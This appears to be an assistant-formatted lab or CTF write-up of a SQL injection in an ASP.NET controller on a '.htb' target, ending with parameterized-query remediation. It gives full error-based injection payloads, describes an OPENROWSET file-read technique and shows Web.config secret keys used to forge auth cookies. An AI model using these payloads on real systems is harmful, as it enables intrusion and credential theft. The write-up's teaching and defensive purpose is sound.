Here is your writeup cleaned up, properly structured, and formatted for readability, along with a technical breakdown and remediation guidance for the vulnerable C# snippet.

  

## Technical Finding Summary: SQL Injection & Arbitrary File Read

### 1. Source Code Review

While auditing `Controllers/MyController.cs`, a SQL injection vulnerability was identified in the `SecondaryEmail()` action.

  

C#

```
cmd.CommandText = string.Format("SELECT * FROM Users WHERE Email = '{0}' OR SecondaryEmail = '{0}'", secondaryEmail);
```

- **Vulnerability Type:** Unsanitized SQL String Concatenation / Format String Injection
    
      
    
- **Impact:** Direct injection into SQL queries, bypassing regex input validation logic.
    
      
    

### 2. Confirming Conditional Error-Based Injection

To confirm execution, a conditional divide-by-zero payload was injected into the `secondaryEmail` parameter:

  

- **True Condition (`1=1`):**
    
      
    
    HTTP
    
    ```
    secondaryEmail=asd@me.com'UNION+SELECT+NULL,NULL,NULL,+CASE+WHEN+(1=1)+THEN+1/0+ELSE+NULL+END;--+-
    ```
    
    - **Result:** The database executed the `THEN 1/0` branch, returning a `Divide by zero error encountered` error message.
        
          
        
- **False Condition (`1=2`):**
    
      
    
    HTTP
    
    ```
    secondaryEmail=asd@me.com'UNION+SELECT+NULL,NULL,NULL,+CASE+WHEN+(1=2)+THEN+1/0+ELSE+NULL+END;--+-
    ```
    
    - **Result:** The query returned a normal `302 Found` HTTP redirect without error, confirming conditional boolean-based logic control.
        
          
        

### 3. Path Disclosure

Verbosity in application error handling disclosed the physical file system path:

  

Plaintext

```
C:\inetpub\wwwroot\vault.royalflush.htb\Controllers\MyController.cs:192
```

This confirmed the web application root path under IIS (`C:\inetpub\wwwroot\vault.royalflush.htb\`).

  

### 4. File Existence Probing via `OPENROWSET(BULK...)`

SQL Server's `OPENROWSET` function was abused to map the local file system. Distinct OS error codes distinguished path states:

  

|**OS Error Code**|**Message**|**Meaning**|
|---|---|---|
|**Code 3**|`The system cannot find the path specified.`|Directory/Path does not exist|
|**Code 5**|`Access is denied.`|File/Directory exists but lacks read permission|
|**Generic**|`The file "..." does not exist or you don't have file access rights.`|Target file missing|

### 5. Exfiltration of Sensitive Configuration (`Web.config`)

By leveraging chunked extraction via SQL injection, the target `Web.config` file was read from disk. The dumped configuration revealed critical application secret keys:

  

XML

```
<appSettings>
  <add key="webpages:Version" value="3.0.0.0" />
  <add key="webpages:Enabled" value="false" />
  <add key="ClientValidationEnabled" value="true" />
  <add key="UnobtrusiveJavaScriptEnabled" value="true" />
  <add key="AuthKey" value="874c2f91-7346-4005-b55d-5077a54a5201" />
  <add key="AuthCookieName" value="user" />
  <add key="PasswordKey" value="f3d9aa53-c08d-43" />
  <add key="PasswordIV" value="5ac8083e-8ff6-43" />
</appSettings>
```

> **Security Impact:** Knowledge of `AuthKey`, `PasswordKey`, and `PasswordIV` allows an attacker to forge session authentication tokens (`user` cookie) and decrypt encrypted user passwords stored in the database.
> 
>   

## Remediation & Secure Coding Practice

To fix the vulnerability in `Controllers/MyController.cs`, replace raw string formatting with **parameterized queries** using `SqlParameter`. Parameterization ensures user input is treated strictly as literal data rather than executable SQL logic.

  

### Insecure Implementation

C#

```
// Vulnerable: Direct string formatting concatenates untrusted input
cmd.CommandText = string.Format("SELECT * FROM Users WHERE Email = '{0}' OR SecondaryEmail = '{0}'", secondaryEmail);
```

### Secure Implementation

C#

```
// Remediation: Use parameterized placeholders
cmd.CommandText = "SELECT * FROM Users WHERE Email = @SecondaryEmail OR SecondaryEmail = @SecondaryEmail";
cmd.Parameters.Add("@SecondaryEmail", SqlDbType.VarChar, 255).Value = secondaryEmail;
```

Additionally, ensure detailed error messages are disabled in production (`<customErrors mode="On" />` in `Web.config`) to prevent disclosing internal source code paths and database exceptions.